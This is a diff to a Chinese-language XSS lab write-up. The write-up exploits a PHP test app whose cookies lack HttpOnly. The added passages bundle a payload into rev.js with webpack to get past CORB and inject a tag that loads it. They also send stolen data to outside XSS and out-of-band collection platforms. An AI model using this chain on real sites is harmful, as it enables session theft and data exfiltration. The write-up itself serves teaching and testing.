@@ -252,7 +252,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" and !empty($_POST["jsr"] and !empty($_P
 
 查看浏览器Cookie，可以看到PHP的session，以及我们提前设置的Cookie。这个Cookie是没有HttpOnly保护的。
 
-<img src="/Users/raidriarb/Library/Application Support/typora-user-images/Screen Shot 2020-11-11 at 11.54.56.png" alt="Screen Shot 2020-11-11 at 11.54.56" style="zoom:67%;" />
+<img src="./pics/Screen Shot 2020-11-11 at 11.54.56.png" style="zoom:67%;" />
 
 在XSS在线平台`https://xs.sb`注册一个账号，建立XSS项目设置我们需要执行的payload，并保存平台生成的链接。
 
@@ -361,6 +361,16 @@ httpRequest.send();
 
 <img src="./pics/Screen Shot 2020-11-11 at 16.01.05.png" alt="Screen Shot 2020-11-11 at 16.01.05" style="zoom:80%;" />
 
+因为浏览器存在CORB限制，我们不能通过读取另一个源执行的js，因此要对js进行webpack生成可以直接执行的js
+
+```
+npm run build
+```
+
+获得webpack文件，再从浏览器打开下载，形成`rev.js`。该js文件就是xss所需的文件，将其放入我们的公网服务器即可。此处为了演示方便，在不影响利用原理的前提下，直接放在了本地的php测试服务器，访问`localhost:yourport/rev.js`即可加载。
+
+pack后的js功能不变，可以直接在浏览器执行。
+
 ### 演示
 
 提前在CEYE带外平台注册账号，记录生成的域名，接下来会通过XSS将数据发送到带外平台。
@@ -375,8 +385,10 @@ httpRequest.send();
 
 构造XSS语句。XSS payload可以放在公网服务器上，此处为了演示方便直接放置在本地。
 
+于是如此构造xss语句即可。
+
 ```
-<img src="//127.0.0.1:8080">
+<img src="//127.0.0.1:8888/rev.js">
 ```
 
 按照刚才的方式，由用户2发送xss语句给用户1
